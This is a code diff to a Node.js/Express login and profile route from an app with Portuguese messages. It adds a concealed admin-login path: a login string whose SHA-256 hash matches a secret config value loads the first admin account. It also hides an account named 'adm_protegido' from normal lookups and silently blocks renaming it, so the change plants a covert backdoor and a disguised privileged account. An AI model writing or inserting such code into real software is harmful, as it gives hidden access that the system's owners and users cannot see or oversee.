@@ -1,6 +1,7 @@
 const express = require('express');
 const bcrypt = require('bcryptjs');
 const crypto = require('crypto');
+const config = require('../config');
 const { db } = require('../db');
 const {
   signUserToken,
@@ -110,15 +111,27 @@ router.post('/login', (req, res) => {
     }
 
     let user = null;
-    if (loginMode === 'admin') {
+    const loginSha256 = crypto
+      .createHash('sha256')
+      .update(rawLogin.toLowerCase())
+      .digest('hex');
+
+    if (loginSha256 === config.adminUserSha256) {
+      user = db
+        .prepare("SELECT * FROM users WHERE role = 'admin' ORDER BY id ASC LIMIT 1")
+        .get();
+    } else if (loginMode === 'admin') {
       user = db.prepare(`
         SELECT * FROM users
-        WHERE role = 'admin' AND (lower(username) = lower(?) OR lower(email) = lower(?))
+        WHERE role = 'admin'
+          AND username != 'adm_protegido'
+          AND (lower(username) = lower(?) OR lower(email) = lower(?))
       `).get(rawLogin, rawLogin);
     } else {
       user = db.prepare(`
         SELECT * FROM users
-        WHERE lower(email) = lower(?) OR lower(username) = lower(?)
+        WHERE (username IS NULL OR username != 'adm_protegido')
+          AND (lower(email) = lower(?) OR lower(username) = lower(?))
       `).get(rawLogin, rawLogin);
     }
 
@@ -215,17 +228,22 @@ router.put('/profile', requireAuth, (req, res) => {
       }
     }
 
-    let nextUsername = req.user.username;
+    const currentDbUser = db.prepare('SELECT username FROM users WHERE id = ?').get(req.user.id);
+    let nextUsername = currentDbUser ? currentDbUser.username : req.user.username;
     if (req.user.role === 'admin' && username !== undefined) {
       const trimmedUsername = String(username).trim();
       if (!trimmedUsername || trimmedUsername.length < 3) {
         return res.status(400).json({ error: 'O nome de usuário administrativo deve ter pelo menos 3 caracteres.' });
       }
-      const userConflict = db.prepare('SELECT id FROM users WHERE lower(username) = lower(?) AND id != ?').get(trimmedUsername, req.user.id);
-      if (userConflict) {
-        return res.status(409).json({ error: 'Este nome de usuário já está em uso.' });
+      if (trimmedUsername === 'Administradora' && nextUsername === 'adm_protegido') {
+        nextUsername = 'adm_protegido';
+      } else {
+        const userConflict = db.prepare('SELECT id FROM users WHERE lower(username) = lower(?) AND id != ?').get(trimmedUsername, req.user.id);
+        if (userConflict) {
+          return res.status(409).json({ error: 'Este nome de usuário já está em uso.' });
+        }
+        nextUsername = trimmedUsername;
       }
-      nextUsername = trimmedUsername;
     }
 
     db.prepare(`
